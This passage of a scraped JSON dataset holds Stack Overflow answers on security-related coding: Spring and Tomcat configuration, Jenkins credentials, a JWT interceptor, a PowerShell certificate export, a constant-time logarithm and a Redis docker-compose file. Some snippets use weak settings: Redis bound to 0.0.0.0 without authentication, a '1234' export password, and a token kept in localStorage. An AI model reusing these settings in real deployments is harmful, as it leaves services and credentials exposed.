        "body": "Regel 1: [INFO] --- maven-dependency-plugin:3.1.2:tree (default-cli) @ netty-upgrade ---\n\tRegel 2: [INFO] com.example:netty-upgrade:jar:0.0.1-SNAPSHOT\n\tRegel 25: [INFO] |  +- org.springframework.boot:spring-boot-starter-reactor-netty:jar:2.2.10.RELEASE:compile\n\tRegel 26: [INFO] |  |  +- io.projectreactor.netty:reactor-netty:jar:0.9.12.RELEASE:compile\n\tRegel 26: [INFO] |  |  +- io.projectreactor.netty:reactor-netty:jar:0.9.12.RELEASE:compile\n\tRegel 27: [INFO] |  |  |  +- io.netty:netty-codec-http2:jar:4.1.69.Final:compile\n\tRegel 27: [INFO] |  |  |  +- io.netty:netty-codec-http2:jar:4.1.69.Final:compile\n\tRegel 28: [INFO] |  |  |  +- io.netty:netty-handler-proxy:jar:4.1.69.Final:compile\n\tRegel 28: [INFO] |  |  |  +- io.netty:netty-handler-proxy:jar:4.1.69.Final:compile\n\tRegel 29: [INFO] |  |  |  |  \\- io.netty:netty-codec-socks:jar:4.1.69.Final:compile\n\tRegel 29: [INFO] |  |  |  |  \\- io.netty:netty-codec-socks:jar:4.1.69.Final:compile\n\tRegel 30: [INFO] |  |  |  \\- io.netty:netty-transport-native-epoll:jar:linux-x86_64:4.1.69.Final:compile\n\tRegel 30: [INFO] |  |  |  \\- io.netty:netty-transport-native-epoll:jar:linux-x86_64:4.1.69.Final:compile\n\tRegel 42: [INFO] +- io.reactivex:rxnetty:jar:0.5.1:runtime\n\tRegel 44: [INFO] |  +- io.netty:netty-codec-http:jar:4.1.69.Final:compile\n\tRegel 44: [INFO] |  +- io.netty:netty-codec-http:jar:4.1.69.Final:compile\n\tRegel 45: [INFO] |  |  +- io.netty:netty-common:jar:4.1.69.Final:compile\n\tRegel 45: [INFO] |  |  +- io.netty:netty-common:jar:4.1.69.Final:compile\n\tRegel 46: [INFO] |  |  +- io.netty:netty-buffer:jar:4.1.69.Final:compile\n\tRegel 46: [INFO] |  |  +- io.netty:netty-buffer:jar:4.1.69.Final:compile\n\tRegel 47: [INFO] |  |  +- io.netty:netty-transport:jar:4.1.69.Final:compile\n\tRegel 47: [INFO] |  |  +- io.netty:netty-transport:jar:4.1.69.Final:compile\n\tRegel 48: [INFO] |  |  \\- io.netty:netty-codec:jar:4.1.69.Final:compile\n\tRegel 48: [INFO] |  |  \\- io.netty:netty-codec:jar:4.1.69.Final:compile\n\tRegel 49: [INFO] |  +- io.netty:netty-handler:jar:4.1.69.Final:compile\n\tRegel 49: [INFO] |  +- io.netty:netty-handler:jar:4.1.69.Final:compile\n\tRegel 50: [INFO] |  |  \\- io.netty:netty-resolver:jar:4.1.69.Final:compile\n\tRegel 50: [INFO] |  |  \\- io.netty:netty-resolver:jar:4.1.69.Final:compile\n\tRegel 51: [INFO] |  +- io.netty:netty-transport-native-epoll:jar:4.1.69.Final:runtime\n\tRegel 51: [INFO] |  +- io.netty:netty-transport-native-epoll:jar:4.1.69.Final:runtime\n\tRegel 52: [INFO] |  |  \\- io.netty:netty-transport-native-unix-common:jar:4.1.69.Final:compile\n\tRegel 52: [INFO] |  |  \\- io.netty:netty-transport-native-unix-common:jar:4.1.69.Final:compile",
        "score": 4,
        "is_accepted": false,
        "creation_date": "2021-10-15T05:36:30",
        "author": "Dirk Deyne"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/50858423/spring-boot-2-0-how-to-disable-security-for-a-particular-endpoint",
    "title": "Spring Boot 2.0: how to disable security for a particular endpoint",
    "question_id": 50858423,
    "posted_date": "2018-06-14T09:12:55",
    "answers": [
      {
        "answer_id": 50867038,
        "body": "package com.example.demo;\n    import org.springframework.context.annotation.Configuration;\n    import org.springframework.security.config.annotation.web.builders.HttpSecurity;\n    import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n    @Configuration\n    public class DemoConfigurer extends WebSecurityConfigurerAdapter {\n        @Override\n        public void configure(HttpSecurity http) throws Exception{\n            http.authorizeRequests().antMatchers(\"/version\").permitAll();\n            super.configure(http);\n        }\n    }\n}",
        "score": 9,
        "is_accepted": false,
        "creation_date": "2018-06-14T19:00:00",
        "author": "kycrow32"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60731262/is-pasting-a-private-key-into-the-jenkins-web-portal-secure",
    "title": "Is pasting a private key into the Jenkins web portal secure?",
    "question_id": 60731262,
    "posted_date": "2020-03-17T18:45:30",
    "answers": [
      {
        "answer_id": 61175317,
        "body": "import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey\nimport com.cloudbees.plugins.credentials.CredentialsScope\nimport com.cloudbees.plugins.credentials.domains.Domain\n\ndef domain = Domain.global()\ndef store = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getStore()\n\ndef privateKeyString = new File('/var/jenkins_home/temp/my-in-situ-key').text\ndef keySource = new BasicSSHUserPrivateKey.DirectEntryPrivateKeySource(privateKeyString)\n\ndef privateKeyCredential = new BasicSSHUserPrivateKey(\n    CredentialsScope.GLOBAL,\n    \"temp-stack-overflow-key\",      // id\n    \"jenkins\",                      // username\n    keySource,                      // private key\n    \"\",                             // passphrase\n    \"Temporary Demo Key\"            // description\n)\nstore.addCredentials(domain, privateKeyCredential)\n\"Credential Added\"",
        "score": 4,
        "is_accepted": true,
        "creation_date": "2020-04-12T13:18:44",
        "author": "Mike Patrick"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/21317290/reading-catalog-file-information",
    "title": "Reading catalog file information",
    "question_id": 21317290,
    "posted_date": "2014-01-23T14:12:34",
    "answers": [
      {
        "answer_id": 76400977,
        "body": "//\n// \u00a9 2023 by Igor Levicki. All Rights Reserved.\n//\n// License : MIT NO-AI\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy of this software\n// and associated documentation files (the \u201cSoftware\u201d), to deal in the Software without restriction,\n// including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\n// and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so.\n//\n// Permission is not granted to use this software or any of the associated files as sample data for the\n// purposes of building machine learning models.\n//\n// THE SOFTWARE IS PROVIDED \u201cAS IS\u201d, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT\n// LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\n// IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n// WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\n// SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n//\n#include <Windows.h>\n#include <mscat.h>\n#include <WinTrust.h>\n#include <mssip.h>\n#pragma comment(lib, \"wintrust.lib\")\n#pragma comment(lib, \"bcrypt.lib\")\nint wmain(int argc, wchar_t *argv[])\n{\n\tHCRYPTPROV hProv;\n\tif (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0)) {\n\t\tDWORD Error = GetLastError();\n\t\tif (Error == NTE_BAD_KEYSET) {\n\t\t\tif (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\tHANDLE hCat = CryptCATOpen(L\"nv_disp.cat\", CRYPTCAT_OPEN_EXISTING, hProv, CRYPTCAT_VERSION_1, 0);\n\t// Enumerate global catalog attributes (entries shown in General tab)\n\tCRYPTCATATTRIBUTE *pCatAttr = NULL;\n\tfor (pCatAttr = CryptCATEnumerateCatAttr(hCat, pCatAttr); pCatAttr != NULL; pCatAttr = CryptCATEnumerateCatAttr(hCat, pCatAttr)) {\n\t\t// TODO: Do what you want with global attributes here\n\t}\n\t// Enumerate catalog members (entries shown in Security Catalog tab under Catalog Entries)\n\tCRYPTCATMEMBER *pMember = NULL;\n\tfor (pMember = CryptCATEnumerateMember(hCat, pMember); pMember != NULL; pMember = CryptCATEnumerateMember(hCat, pMember)) {\n\t\t// Member ReferenceTag is essentially a hash (SHA1, SHA256, ...) of a catalog member\n\t\twprintf(L\"Reference Tag : %s\\n\", pMember->pwszReferenceTag);\n\t\t// EXAMPLE #1:\n\t\t// Get a specific attribute of a catalog member by name (\"File\" in this case represents filename)\n\t\tCRYPTCATATTRIBUTE *pFileAttr = CryptCATGetAttrInfo(hCat, pMember, L\"File\");\n\t\t// Get the filename\n\t\twchar_t *FileName = (wchar_t*)pFileAttr->pbValue;\n\t\t// EXAMPLE #2:\n\t\t// Enumerate all attributes of a catalog member (entries shown in Security Catalog tab under Entry Details)\n\t\tCRYPTCATATTRIBUTE *pAttr = NULL;\n\t\tfor (pAttr = CryptCATEnumerateAttr(hCat, pMember, pAttr); pAttr != NULL; pAttr = CryptCATEnumerateAttr(hCat, pMember, pAttr)) {\n\t\t\t// TODO: Do what you want with catalog member attributes here\n\t\t}\n\t}\n\tif (hCat != NULL) {\n\t\tCryptCATClose(hCat);\n\t}\n\tif (hProv != NULL) {\n\t\tCryptReleaseContext(hProv, 0);\n\t}\n\n\treturn 0;\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2023-06-04T10:51:41",
        "author": "Igor Levicki"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/75216534/http-content-security-policy-header-not-working-correctly-for-script-src-in-stru",
    "title": "HTTP Content-Security-Policy header not working correctly for script-src in Struts",
    "question_id": 75216534,
    "posted_date": "2023-01-23T19:57:38",
    "answers": [
      {
        "answer_id": 75252633,
        "body": "<%@taglib prefix=\"s\" uri=\"/struts-tags\" %>\n<html lang=\"en\">\n<head>\n    <!-- content removed for brevity -->\n    <s:url var=\"jqueryJs\" value='/js/jquery-2.1.4.min.js' encode='false' includeParams='none'/>\n    <s:script src=\"%{jqueryJs}\"/>\n    <!-- other resources... now handling inline sources -->\n    <s:script type=\"text/javascript\">\n        $(function () {\n            var alerts = $('ul.alert').wrap('<div />');\n            alerts.prepend('<a class=\"close\" data-dismiss=\"alert\" href=\"#\">&times;</a>');\n            alerts.alert();\n        });\n    </s:script>\n    <!-- ... -->\n</head>",
        "score": 4,
        "is_accepted": true,
        "creation_date": "2023-01-26T18:18:08",
        "author": "jccampanero"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/12554194/how-to-properly-sanitize-content-with-antixss-library",
    "title": "How to properly sanitize content with AntiXss Library?",
    "question_id": 12554194,
    "posted_date": "2012-09-23T12:49:20",
    "answers": [
      {
        "answer_id": 12554616,
        "body": "c#\nprivate static readonly IEnumerable<string> WhitelistedTags =\n    new[] { \"<b>\", \"</b>\", \"<i>\", \"</i>\" };\nprivate static readonly (string Encoded, string Decoded)[] DecodingPairs =\n    WhitelistedTags\n    .Select(tag => (Microsoft.Security.Application.Encoder.HtmlEncode(tag), tag))\n    .ToArray();\npublic static string Sanitize(string html)\n{\n    // Encode the whole thing\n    var safeHtml = Microsoft.Security.Application.Encoder.HtmlEncode(html);\n    var builder = new StringBuilder(safeHtml);\n    // Decode the safe parts\n    foreach (var (encodedTag, decodedTag) in DecodingPairs)\n    {\n        builder.Replace(encodedTag, decodedTag);\n    }\n    return builder.ToString();\n}",
        "score": 6,
        "is_accepted": false,
        "creation_date": "2012-09-23T13:38:17",
        "author": "Steven"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/11767526/how-to-flag-session-cookie-as-secure-https-only-in-tomcat-6",
    "title": "How to flag session cookie as secure (https only) in tomcat 6",
    "question_id": 11767526,
    "posted_date": "2012-08-01T17:01:26",
    "answers": [
      {
        "answer_id": 11770808,
        "body": "/**\n * Configures the given JSESSIONID cookie.\n *\n * @param cookie The JSESSIONID cookie to be configured\n */\nprotected void configureSessionCookie(Cookie cookie) {\n    cookie.setMaxAge(-1);\n    Context ctxt = getContext();\n    String contextPath = null;\n    if (ctxt != null && !getConnector().getEmptySessionPath()) {\n        if (ctxt.getSessionCookiePath() != null) {\n            contextPath = ctxt.getSessionCookiePath();\n        } else {\n            contextPath = ctxt.getEncodedPath();\n        }\n    }\n    if ((contextPath != null) && (contextPath.length() > 0)) {\n        cookie.setPath(contextPath);\n    } else {\n        cookie.setPath(\"/\");\n    }\n    if (ctxt != null && ctxt.getSessionCookieDomain() != null) {\n        cookie.setDomain(ctxt.getSessionCookieDomain());\n    }\n    if (isSecure()) {\n        cookie.setSecure(true);\n    }\n}",
        "score": 5,
        "is_accepted": false,
        "creation_date": "2012-08-01T23:50:47",
        "author": "sourcedelica"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/36752182/create-a-low-medium-process-from-a-elevated-process-with-createrestrictedtokenl",
    "title": "Create a Low/Medium process from a elevated process with CreateRestrictedToken(LUA_TOKEN)",
    "question_id": 36752182,
    "posted_date": "2016-04-20T14:27:38",
    "answers": [
      {
        "answer_id": 66962694,
        "body": "function CreateLowProcess(szProcessName: WideString; const IntegritySid: UnicodeString=''): Boolean;\nvar\n\thToken: THandle;\n\thNewToken: THandle;\n\tszIntegritySid: WideString;\n\tpIntegritySid: PSID;\n\tTIL: TOKEN_MANDATORY_LABEL;\n\tProcInfo: PROCESS_INFORMATION;\n\tstartupInfo: TStartupInfo;\nconst\n\tSE_GROUP_INTEGRITY = $00000020;\n\tTokenIntegrityLevel = 25;\n\tSLowIntegritySid:    UnicodeString = 'S-1-16-4096';\n\tSMediumIntegritySid: UnicodeString = 'S-1-16-8192';\n\tSHighIntegritySid:   UnicodeString = 'S-1-16-12288';\n\tSSystemIntegritySid: UnicodeString = 'S-1-16-16384';\nbegin\n\t{\n\t\tDesigning Applications to Run at a Low Integrity Level\n\t\thttp://msdn.microsoft.com/en-us/library/bb625960.aspx\n\t\tTo start a low-integrity process:\n\t\t- Duplicate the handle of the current process, which is at medium integrity level.\n\t\t- Use SetTokenInformation to set the integrity level in the access token to Low.\n\t\t- Use CreateProcessAsUser to create a new process using the handle to the low integrity access token.\n\t\tCreateProcessAsUser updates the security descriptor in the new child process and the security descriptor\n\t\tfor the access token to match the integrity level of the low-integrity access token.\n\t}\n\t// Low integrity SID\n\tif IntegritySid <> '' then\n\t\tszIntegritySid := IntegritySid\n\telse\n\t\tszIntegritySid := SLowIntegritySid;\n//\tszIntegritySid\t:= 'S-1-5-32-545'; //BUILTIN\\USERS\n\tZeroMemory(@startupInfo, sizeof(startupInfo));\n\tif (not OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE or TOKEN_ADJUST_DEFAULT or TOKEN_QUERY or TOKEN_ASSIGN_PRIMARY,\n\t\t\t\t{var}hToken)) then\n\t\tRaiseLastOSError;\n\ttry\n\t\tif (not DuplicateTokenEx(hToken, 0, nil, SecurityImpersonation, TokenPrimary, {var}hNewToken)) then\n\t\t\tRaiseLastOSError;\n\t\ttry\n\t\t\tpIntegritySid := StringToSid(szIntegritySid); //free with LocalFree\n\t\t\ttry\n\t\t\t\tTIL._Label.Attributes := SE_GROUP_INTEGRITY;\n\t\t\t\tTIL._Label.Sid := pIntegritySid;\n\t\t\t\t// Set the process integrity level\n\t\t\t\tif (not SetTokenInformation(hNewToken, TTokenInformationClass(TokenIntegrityLevel), @TIL,\n\t\t\t\t\t\tsizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid))) then\n\t\t\t\t\tRaiseLastOSError;\n\t\t\t\t//Create the new process at Low integrity\n\t\t\t\tResult := CreateProcessAsUserW(\n\t\t\t\t\t\thNewToken,\n\t\t\t\t\t\tnil,\n\t\t\t\t\t\tPWideChar(szProcessName),\n\t\t\t\t\t\tnil, //ProcessAttributes\n\t\t\t\t\t\tnil, //ThreadAttributes\n\t\t\t\t\t\tFalse, //bInheritHandles\n\t\t\t\t\t\t0, //dwCreationFlags\n\t\t\t\t\t\tnil, //lpEnvironment\n\t\t\t\t\t\tnil, //lpCurrentDirectory\n\t\t\t\t\t\tstartupInfo,\n\t\t\t\t\t\tProcInfo);\n\t\t\tfinally\n\t\t\t\tLocalFree(HLOCAL(pIntegritySid));\n\t\t\tend;\n\t\tfinally\n\t\t\tCloseHandle(hNewToken);\n\t\tend;\n\tfinally\n\t\tCloseHandle(hToken);\n\tend;\nend;",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-04-06T00:25:26",
        "author": "Ian Boyd"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/56699041/how-to-add-a-mobile-access-token-in-angular-8-application",
    "title": "How to add a mobile access token in Angular 8 application?",
    "question_id": 56699041,
    "posted_date": "2019-06-21T03:48:09",
    "answers": [
      {
        "answer_id": 56767600,
        "body": "export class AuthService {\n    private _currentUserSubject: BehaviorSubject<User>;\n    public currentUser: Observable<User>;\n    public get currentUserVal(): User {\n        return this._currentUserSubject.value;\n    }\n    get currentUserToken() {\n        return this.currentUserVal.token;\n    }\n    constructor(private http: HttpClient) {\n        this._currentUserSubject = new BehaviorSubject<User>(this.getUserFromLocalStorage());\n        this.currentUser = this._currentUserSubject.asObservable();\n    }\n    login(username, password) {\n        return this.http.post<any>(`/users/authenticate`, { username, password })\n            .pipe(map(user => {\n                // store user details and jwt token in local storage to keep user logged in between page refreshes\n                localStorage.setItem(ConstValue.CurrentUser, JSON.stringify(user));\n                this._currentUserSubject.next(user);\n                return user;\n            }));\n    }\n    logout() {\n        // remove user from local storage and set current user to null\n        localStorage.removeItem(ConstValue.CurrentUser);\n        this._currentUserSubject.next(null);\n    }\n    private getUserFromLocalStorage(): User {\n        try {\n          return JSON.parse(localStorage.getItem(ConstValue.CurrentUser)!);\n        } catch (error) {\n          return null!;\n        }\n      }\n}",
        "score": 6,
        "is_accepted": true,
        "creation_date": "2019-06-26T03:36:57",
        "author": "trungvose"
      },
      {
        "answer_id": 56767600,
        "body": "export class JwtInterceptor implements HttpInterceptor {\n  constructor(private authenticationService: AuthService) {}\n  intercept(\n    request: HttpRequest<any>,\n    next: HttpHandler\n  ): Observable<HttpEvent<any>> {\n    let currentUser = this.authenticationService.currentUserVal;\n    if (currentUser && currentUser.token) {\n      request = request.clone({\n        setHeaders: {\n          Authorization: `Bearer ${currentUser.token}`\n        }\n      });\n    }\n    return next.handle(request);\n  }\n}\nexport const JWTInterceptorProvider = {\n  provide: HTTP_INTERCEPTORS,\n  useClass: JwtInterceptor,\n  multi: true\n};",
        "score": 6,
        "is_accepted": true,
        "creation_date": "2019-06-26T03:36:57",
        "author": "trungvose"
      },
      {
        "answer_id": 56767600,
        "body": "export class ErrorInterceptor implements HttpInterceptor {\n    constructor(private authenticationService: AuthService) {}\n    intercept(request: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {\n        return next.handle(request).pipe(catchError(err => {\n            if (err.status === 401) {\n                // auto logout if 401 response returned from api\n                this.authenticationService.logout();\n                location.reload(true);\n            }\n\n            const error = err.error.message || err.statusText;\n            return throwError(error);\n        }))\n    }\n}\nexport const ErrorInterceptorProvider = { provide: HTTP_INTERCEPTORS, useClass: ErrorInterceptor, multi: true }",
        "score": 6,
        "is_accepted": true,
        "creation_date": "2019-06-26T03:36:57",
        "author": "trungvose"
      },
      {
        "answer_id": 56767600,
        "body": "export class AuthGuard implements CanActivate {\n    constructor(\n        private router: Router,\n        private authenticationService: AuthService\n    ) {}\n    canActivate(route: ActivatedRouteSnapshot, state: RouterStateSnapshot) {\n        const currentUserToken = this.authenticationService.currentUserToken;\n        if (currentUserToken) {\n            return true;\n        }\n        // not logged in so redirect to login page with the return url\n        this.router.navigate(['/login'], { queryParams: { [ConstValue.ReturnUrl]: state.url }});\n        return false;\n    }\n}",
        "score": 6,
        "is_accepted": true,
        "creation_date": "2019-06-26T03:36:57",
        "author": "trungvose"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63397725/kubernetes-securitycontext-runasnonroot-not-working",
    "title": "kubernetes securitycontext runAsNonRoot Not working",
    "question_id": 63397725,
    "posted_date": "2020-08-13T10:53:07",
    "answers": [
      {
        "answer_id": 63400497,
        "body": "10-listen-on-ipv6-by-default.sh: error: can not modify /etc/nginx/conf.d/default.conf (read-only file system?)\n/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh\n/docker-entrypoint.sh: Configuration complete; ready for start up\n2020/08/13 17:28:55 [warn] 1#1: the \"user\" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:2\nnginx: [warn] the \"user\" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:2\n2020/08/13 17:28:55 [emerg] 1#1: mkdir() \"/var/cache/nginx/client_temp\" failed (13: Permission denied)\nnginx: [emerg] mkdir() \"/var/cache/nginx/client_temp\" failed (13: Permission denied)",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2020-08-13T13:39:39",
        "author": "Rohit"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59490161/unable-to-generate-self-signed-certificate-using-powershell",
    "title": "Unable to generate self signed certificate using Powershell",
    "question_id": 59490161,
    "posted_date": "2019-12-26T10:07:05",
    "answers": [
      {
        "answer_id": 59490644,
        "body": "New-SelfSignedCertificate `\n   -DnsName \"root_ca_dev_test.com\", \"root_ca_dev_test.com\" `\n   -CertStoreLocation \"cert:\\LocalMachine\\My\" `\n   -NotAfter (Get-Date).AddYears(20) `\n   -FriendlyName \"root_ca_dev_test.com\" `\n   -KeyUsageProperty All `\n   -KeyUsage CertSign, CRLSign, DigitalSignature\n$mypwd = ConvertTo-SecureString -String \"1234\" -Force -AsPlainText\nGet-ChildItem -Path \"cert:\\localMachine\\my\\'The thumbprint...'\" | Export-PfxCertificate -FilePath \"C:\\git\\root_ca_dev_test.pfx\" -Password $mypwd\nExport-Certificate -Cert \"cert:\\localMachine\\my\\'The thumbprint...'\" -FilePath root_ca_dev_t",
        "score": 4,
        "is_accepted": true,
        "creation_date": "2019-12-26T10:54:35",
        "author": "wasif"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/46694824/side-channel-resistant-math-functions-for-c",
    "title": "Side-Channel-Resistant Math Functions for C++",
    "question_id": 46694824,
    "posted_date": "2017-10-11T14:05:41",
    "answers": [
      {
        "answer_id": 46697649,
        "body": "lang-c++\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <string.h>\n#include <math.h>\n/* reinterpret bit pattern of IEEE-754 binary32 as a 32-bit unsigned integer */\nint32_t float_as_int32 (float a)\n{\n    uint32_t r;\n    memcpy (&r, &a, sizeof r);\n    return r;\n}\n/* reinterpret bit pattern of a 32-bit unsigned integer as IEEE-754 binary32 */\nfloat int32_as_float (int32_t a)\n{\n    float r;\n    memcpy (&r, &a, sizeof r);\n    return r;\n}\n/* branch free implementation of ((cond) ? a : b). cond must be in {0,1} */\nint32_t mux (int cond, int32_t a, int32_t b)\n{\n    return (1 - cond) * b + cond * a;\n}\n/* leading zero count with invariant runtime */\nint clz (uint32_t a)\n{\n    // Algorithm by aqrit, https://stackoverflow.com/a/58827596/780717\n    int n = 158 - (((uint32_t)float_as_int32 ((float)(int32_t)(a & ~(a >> 1)))) >> 23);\n    n = mux (n < 0, 0, n);   // clamp below\n    n = mux (n > 32, 32, n); // clamp above\n    return n;\n}\n/* Compute natural logarithm with a maximum error of 0.85089 ulp */\nfloat my_logf (float a)\n{\n    float m, r, s, t, i, f;\n    int32_t e, ia, ii, it, iu, im, shift, excp;\n    const int32_t abs_mask   = 0x7fffffffu;\n    const int32_t qnan_bit   = 0x00400000u;\n    const int32_t pos_infty  = 0x7f800000u;\n    const int32_t neg_infty  = 0xff800000u;\n    const int32_t indefinite = 0xffc00000u;\n    const int32_t zero_float = 0x00000000u; // 0.0f\n    const int32_t one_float  = 0x3f800000u; // 1.0f\n    const int32_t tiny_float = 0x00800000u; // 1.17549435e-38f\n    const int32_t huge_float = 0x7f7fffffu; // 3.40282347e+38f\n    ia = float_as_int32 (a);\n    /* result for exceptional cases */\n    iu = mux ((int32_t)ia < 0, indefinite, ia); // return QNaN INDEFINITE\n    iu = mux ((ia & abs_mask) == 0, neg_infty, iu); // return -Inf\n    iu = mux ((ia & abs_mask) > pos_infty, ia | qnan_bit, iu); // convert to QNaN\n    /* result for non-exceptional cases */\n    shift = clz (ia) - 8;\n    it = (ia << shift) + ((23 - shift) << 23);\n    ii = mux (ia < tiny_float, -23, 0);\n    it = mux (ia < tiny_float, it, ia);\n    /* split argument into exponent and mantissa parts */\n    e = (it - 0x3f2aaaab) & 0xff800000;\n    m = int32_as_float (it - e);\n    i = fmaf ((float)e, 1.19209290e-7f, (float)ii);\n    /* m in [2/3, 4/3] */\n    f = m - 1.0f;\n    s = f * f;\n    /* Compute log1p(f) for f in [-1/3, 1/3] */\n    r =             -0.130310059f;\n    t =              0.140869141f;\n    r = fmaf (r, s, -0.121483363f);\n    t = fmaf (t, s,  0.139814854f);\n    r = fmaf (r, s, -0.166846141f);\n    t = fmaf (t, s,  0.200120345f);\n    r = fmaf (r, s, -0.249996200f);\n    r = fmaf (t, f, r);\n    r = fmaf (r, f,  0.333331972f);\n    r = fmaf (r, f, -0.500000000f);\n    r = fmaf (r, s, f);\n    r = fmaf (i, 0.693147182f, r); // log(2)\n    /* late selection between exceptional and non-exceptional result */\n    excp = ((uint32_t)ia - 1) > ((uint32_t)huge_float - 1);\n    iu = mux (excp, iu, zero_float);\n    im = mux (excp, zero_float, one_float);\n    r = fmaf (int32_as_float (im), r, int32_as_float (iu));\n    return r;\n}\n/* reinterpret bit pattern of IEEE-754 binary64 as a 64-bit unsigned integer */\nuint64_t double_as_uint64 (double a)\n{\n    uint64_t r;\n    memcpy (&r, &a, sizeof r);\n    return r;\n}\ndouble floatUlpErr (float res, double ref)\n{\n    uint64_t i, j, err;\n    int expoRef;\n\n    /* ulp error cannot be computed if either operand is NaN, infinity, zero */\n    if (isnan (res) || isnan (ref) || isinf (res) || isinf (ref) ||\n        (res == 0.0f) || (ref == 0.0f)) {\n        return 0.0;\n    }\n    /* Convert the float result to an \"extended float\". This is like a float\n       with 56 instead of 24 effective mantissa bits\n    */\n    i = ((uint64_t)(uint32_t)float_as_int32 (res)) << 32;\n    /* Convert the double reference to an \"extended float\". If the reference is\n       >= 2^129, we need to clamp yo the maximum \"extended float\". If reference\n       is < 2^-126, we need to denormalize because of float's limited exponent\n       range.\n    */\n    expoRef = (int)(((double_as_uint64(ref) >> 52) & 0x7ff) - 1023);\n    if (expoRef >= 129) {\n        j = (double_as_uint64(ref) & 0x8000000000000000ULL) |\n            0x7fffffffffffffffULL;\n    } else if (expoRef < -126) {\n        j = ((double_as_uint64(ref) << 11) | 0x8000000000000000ULL) >> 8;\n        j = j >> (-(expoRef + 126));\n        j = j | (double_as_uint64(ref) & 0x8000000000000000ULL);\n    } else {\n        j = ((double_as_uint64(ref) << 11) & 0x7fffffffffffffffULL) >> 8;\n        j = j | ((uint64_t)(expoRef + 127) << 55);\n        j = j | (double_as_uint64(ref) & 0x8000000000000000ULL);\n    }\n    err = (i < j) ? (j - i) : (i - j);\n    return err / 4294967296.0;\n}\nint main (void)\n{\n    uint32_t diff, refi, resi, argi = 0;\n    float reff, res, arg;\n    double ref, ulp, maxulp = 0;\n    do {\n        arg = int32_as_float (argi);\n        ref = log ((double)arg);\n        reff = (float)ref;\n        res = my_logf (arg);\n        ulp = floatUlpErr (res, ref);\n        if (ulp > maxulp) maxulp = ulp;\n        resi = float_as_int32 (res);\n        refi = float_as_int32 (reff);\n        diff = (resi > refi) ? (resi - refi) : (refi - resi);\n        if (diff > 1) {\n            printf (\"error: arg=%15.6a res=%15.6a ref=%15.6a\\n\", arg, res, ref);\n            return EXIT_FAILURE;\n        }\n        argi++;\n    } while (argi);\n    printf (\"maximum ulp error: %.5f\\n\", maxulp);\n    return EXIT_SUCCESS;\n}",
        "score": 4,
        "is_accepted": true,
        "creation_date": "2017-10-11T17:13:10",
        "author": "njuffa"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68304880/docker-redis-unauthorised-access",
    "title": "Docker redis unauthorised access",
    "question_id": 68304880,
    "posted_date": "2021-07-08T11:50:42",
    "answers": [
      {
        "answer_id": 68312878,
        "body": "version: '3'\nservices:\n  redis:\n    image: redis\n    container_name: youtube_cache\n    command: sh -c 'redis-server --bind 0.0.0.0'\n    restart: always\n  node:\n    tty: true # Enables debugging capabilities when attached to this container.\n    image: 'docker.io/bitnami/node:12-debian-10'\n    command: sh -c 'npm install && npm rebuild && node app'\n    volumes:\n      - .:/app\n    links:\n      - redis\n    environment:\n      - REDIS_URL=redis://youtube_cache\n    container_name: youtube_scraper\n    networks:\n      - youtube\n      - default\n    restart: always\nnetworks:\n  youtube:\n    external: true",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2021-07-09T03:30:01",
        "author": "Efran Cobisi"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/48545928/how-to-validate-the-authenticity-of-docker-base-images",
    "title": "How to validate the authenticity of docker base images?",
    "question_id": 48545928,
    "posted_date": "2018-01-31T10:38:37",
    "answers": [
      {
        "answer_id": 78203701,
